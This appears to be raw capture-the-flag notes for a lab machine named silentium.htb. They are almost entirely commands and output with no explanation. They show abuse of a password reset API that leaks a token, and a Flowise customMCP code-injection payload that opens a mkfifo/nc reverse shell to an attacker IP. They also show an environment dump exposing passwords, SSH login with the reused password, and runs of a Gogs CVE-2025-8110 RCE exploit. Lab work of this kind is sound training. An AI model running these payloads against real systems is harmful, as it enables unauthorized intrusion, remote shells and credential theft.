
![[Pasted image 20260730180728.png]]


```
nmap -sCV 10.129.245.103  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-29 18:27 -0400
Nmap scan report for 10.129.245.103
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds

```


```
gobuster vhost -u http://silentium.htb/ -w /usr/share/wordlists/dirb/common.txt --append-domain
```

![[Pasted image 20260730043834.png]]


![[Pasted image 20260730043909.png]]

![[Pasted image 20260730043937.png]]





```
curl -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
     -H "Content-Type: application/json" \
     -d '{"user": {"email": "ben@silentium.htb"}}'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG","tempToken":"x51CvRtit8S3JJ2GNtsaWBdoK632KiL3pGxS0yZH8g9xSde65dd3AKP2Rdkoz1uO","tokenExpiry":"2026-07-29T23:03:07.078Z","status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-07-29T22:48:07.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}  
```

```
curl -s http://staging.silentium.htb/api/v1/account/reset-password \
  -X POST -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"x51CvRtit8S3JJ2GNtsaWBdoK632KiL3pGxS0yZH8g9xSde65dd3AKP2Rdkoz1uO","password":"Hacked123!"}}'
{"user":{"id":"e26c9d6c-678c-4c10-9e36-01813e8fea73","name":"admin","email":"ben@silentium.htb","credential":"$2a$05$TYOJiZLrZ/4yULtzY7mVjuXFzp88Q7gCDnw84Dl3CTburgFx9V.Wm","tempToken":"","tokenExpiry":null,"status":"active","createdDate":"2026-01-29T20:14:57.000Z","updatedDate":"2026-07-29T22:51:28.000Z","createdBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73","updatedBy":"e26c9d6c-678c-4c10-9e36-01813e8fea73"},"organization":{},"organizationUser":{},"workspace":{},"workspaceUser":{},"role":{}}   
```




![[Pasted image 20260730045130.png]]


![[Pasted image 20260730052653.png]]


hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc

pass: r04D!!_R4ge
user:ben

```
curl -s http://staging.silentium.htb/api/v1/node-load-method/customMCP \
-X POST \
-H "Content-Type: application/json" \
-H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
-d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(()=>{process.mainModule.require(\"child_process\").exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.60 443 >/tmp/f\");return 1;})()})"}}'
[{"label":"No Available Actions","name":"error","description":"No available actions, please check your API key and refresh"}]                                                     
```


```
nc -lvnp 443   
listening on [any] 443 ...
connect to [10.10.14.60] from (UNKNOWN) [10.129.245.103] 39879
sh: can't access tty; job control turned off
/ # ls
bin
dev
etc
home
lib
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
/ # cd home
/home # ls
node
/home # cd node
/home/node # ls
/home/node # whoami
root
/home/node # pwd
/home/node
/home/node # cd ../../
/ # cd root
~ # ls
~ # ls -ls
total 0
~ # ls -la
total 16
drwx------    1 root     root          4096 Apr  8 09:41 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
-rw-------    1 root     root             9 Jan 29 21:22 .ash_history
drwxr-xr-x    3 root     root          4096 Jul 29 22:52 .flowise
~ # pwd
/root
~ # cd ..
/ # cd home 
/home # ls -la
total 12
drwxr-xr-x    1 root     root          4096 Jul 16  2025 .
drwxr-xr-x    1 root     root          4096 Apr  8 15:14 ..
drwxr-sr-x    2 node     node          4096 Jul 16  2025 node
/home # cd node 
/home/node # ls -la
total 8
drwxr-sr-x    2 node     node          4096 Jul 16  2025 .
drwxr-xr-x    1 root     root          4096 Jul 16  2025 ..
/home/node # cd ../..
/ # env
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/home/node
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
/ # 

```

```ssh ben@10.129.245.103                                                                      
The authenticity of host '10.129.245.103 (10.129.245.103)' can't be established.
ED25519 key fingerprint is: SHA256:OZNUeTZ9jastNKKQ1tFXatbeOZzSFg5Dt7nhwhjorR0
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:77: [hashed name]
    ~/.ssh/known_hosts:80: [hashed name]
    ~/.ssh/known_hosts:81: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.245.103' (ED25519) to the list of known hosts.
ben@10.129.245.103's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Wed Jul 29 11:08:31 PM UTC 2026

  System load:           0.0
  Usage of /:            82.9% of 13.37GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.103
  IPv6 address for eth0: dead:beef::250:56ff:fe95:ccde


Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Last login: Wed Apr  8 19:12:55 2026 from 10.10.14.5
ben@silentium:~$ pwd
/home/ben
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt
2a1187a4b6712c60654a282f44a1a674
ben@silentium:~$ wget https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
--2026-07-29 23:16:28--  https://raw.githubusercontent.com/zAbuQasem/gogs-CVE-2025-8110/refs/heads/main/CVE-2025-8110.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... failed: Temporary failure in name resolution.
wget: unable to resolve host address ‘raw.githubusercontent.com’
ben@silentium:~$ ls
user.txt
ben@silentium:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Apr  8 19:53 .
drwxr-xr-x 3 root root 4096 Apr  8 09:41 ..
-rw------- 1 ben  ben     0 Apr  8 19:53 .bash_history
-rw-r--r-- 1 ben  ben   220 Jan 29 13:53 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Jan 29 13:53 .bashrc
drwx------ 2 ben  ben  4096 Apr  8 09:41 .cache
-rw-r--r-- 1 ben  ben   807 Jan 29 13:53 .profile
-rw-r----- 1 root ben    33 Jul 29 22:29 user.txt
ben@silentium:~$ nano exploit_cve-2025-8110.py
ben@silentium:~$ ls
exploit_cve-2025-8110.py  user.txt
ben@silentium:~$ chmod +x exploit_cve-2025-8110.py
ben@silentium:~$ python3 exploit_cve-2025-8110.py -u http://silentium.htb/ -lh 10.10.14.60 -lp 4444
Traceback (most recent call last):
  File "/home/ben/exploit_cve-2025-8110.py", line 11, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
ben@silentium:~$ python3 exploit_cve-2025-8110.py -u http://127.0.0.1:8080
Traceback (most recent call last):
  File "/home/ben/exploit_cve-2025-8110.py", line 11, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
ben@silentium:~$ nano exploit.py
ben@silentium:~$ python3 exploit.py -u http://127.0.0.1:8080
Traceback (most recent call last):
  File "/home/ben/exploit.py", line 11, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
ben@silentium:~$ python3 --version
Python 3.12.3
ben@silentium:~$ python3 -m pip --version
/usr/bin/python3: No module named pip
ben@silentium:~$ which python3
/usr/bin/python3
ben@silentium:~$ python3 -m ensurepip --user
/usr/bin/python3: No module named ensurepip
ben@silentium:~$ python3 -m ensurepip --user
/usr/bin/python3: No module named ensurepip
ben@silentium:~$ ls -la
total 44
drwxr-x--- 4 ben  ben  4096 Jul 29 23:25 .
drwxr-xr-x 3 root root 4096 Apr  8 09:41 ..
-rw------- 1 ben  ben     0 Apr  8 19:53 .bash_history
-rw-r--r-- 1 ben  ben   220 Jan 29 13:53 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Jan 29 13:53 .bashrc
drwx------ 2 ben  ben  4096 Apr  8 09:41 .cache
-rwxrwxr-x 1 ben  ben  7876 Jul 29 23:18 exploit_cve-2025-8110.py
-rw-rw-r-- 1 ben  ben  3045 Jul 29 23:25 exploit.py
drwxrwxr-x 3 ben  ben  4096 Jul 29 23:17 .local
-rw-r--r-- 1 ben  ben   807 Jan 29 13:53 .profile
-rw-r----- 1 root ben    33 Jul 29 22:29 user.txt
ben@silentium:~$ chmod +x exploit.py
ben@silentium:~$ python3 exploit.py -u http://127.0.0.1:8080
Traceback (most recent call last):
  File "/home/ben/exploit.py", line 11, in <module>
    from bs4 import BeautifulSoup
ModuleNotFoundError: No module named 'bs4'
ben@silentium:~$ python3 -m venv venv
source venv/bin/activate
python -m pip install beautifulsoup4 requests

```

```
ssh -L 3001:127.0.0.1:3001 ben@10.129.1.137  

ben@10.129.1.137's password: 
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-107-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Jul 30 11:55:37 AM UTC 2026

  System load:           0.0
  Usage of /:            82.9% of 13.37GB
  Memory usage:          19%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.1.137
  IPv6 address for eth0: dead:beef::250:56ff:fe95:164e


Expanded Security Maintenance for Applications is not enabled.

68 updates can be applied immediately.
52 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

1 additional security update can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jul 30 10:04:41 2026 from 10.10.14.60
ben@silentium:~$ 


```

![[Pasted image 20260730175922.png]]


![[Pasted image 20260730180417.png]]


```


┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# mousepad CVE-2025-8110-RCE.py                                                                

^C                                                                                                                                                             
┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:8081  -lh 10.10.14.60 -lp 6666 -p 'admin123'


   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|
                       
CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection


Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[-] Error: HTTPConnectionPool(host='127.0.0.1', port=8081): Max retries exceeded with url: /user/login (Caused by 
NewConnectionError("HTTPConnection(host='127.0.0.1', port=8081): Failed to establish a new connection: [Errno 111] Connection refused"))

┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:3001 -lh 10.10.14.60 -lp 6666 -p 'admin123' 


   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|
                       
CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection


Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[+] Login exitoso
Repo creation status: 201
[+] Repo creado: 11ddc3c6d693
Clonando con URL: http://admin123:admin123@127.0.0.1:3001/admin123/11ddc3c6d693.git
[master 28a5b36] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 7 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 295 bytes | 295.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://127.0.0.1:3001/admin123/11ddc3c6d693.git
   ca8fd02..28a5b36  master -> master
[+] Symlink subido y pusheado correctamente
[-] Error: HTTPConnectionPool(host='127.0.0.1', port=3001): Read timed out. (read timeout=10)
  
┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# 

```

![[Pasted image 20260730180245.png]]



![[Pasted image 20260730180103.png]]

```


┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# python3 CVE-2025-8110-RCE.py -u http://127.0.0.1:3001 -lh 10.10.14.60 -lp 6666 -p 'admin123' 


   _____ _____   _____ 
  / ____|  __ \ / ____|
 | |  __| |__) | |  __ 
 | | |_ |  _  /| | |_ |
 | |__| | | \ \| |__| |
  \_____|_|  \_\\_____|
                       
CVE-2025-8110 - Gogs Remote Code Execution
Authenticated RCE via Symlink + sshCommand Injection


Author : ghxtsec
Based on: zAbuQasem original PoC
------------------------------------------------

[+] Login exitoso
Repo creation status: 201
[+] Repo creado: 11ddc3c6d693
Clonando con URL: http://admin123:admin123@127.0.0.1:3001/admin123/11ddc3c6d693.git
[master 28a5b36] Add malicious symlink
 1 file changed, 1 insertion(+)
 create mode 120000 malicious_link
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 7 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 295 bytes | 295.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0 (from 0)
To http://127.0.0.1:3001/admin123/11ddc3c6d693.git
   ca8fd02..28a5b36  master -> master
[+] Symlink subido y pusheado correctamente
[-] Error: HTTPConnectionPool(host='127.0.0.1', port=3001): Read timed out. (read timeout=10)

┌──(root㉿kali)-[/tmp/exploit/CVE-2025-8110]
└─# 

```

![[Pasted image 20260730180336.png]]


![[Pasted image 20260730180642.png]]
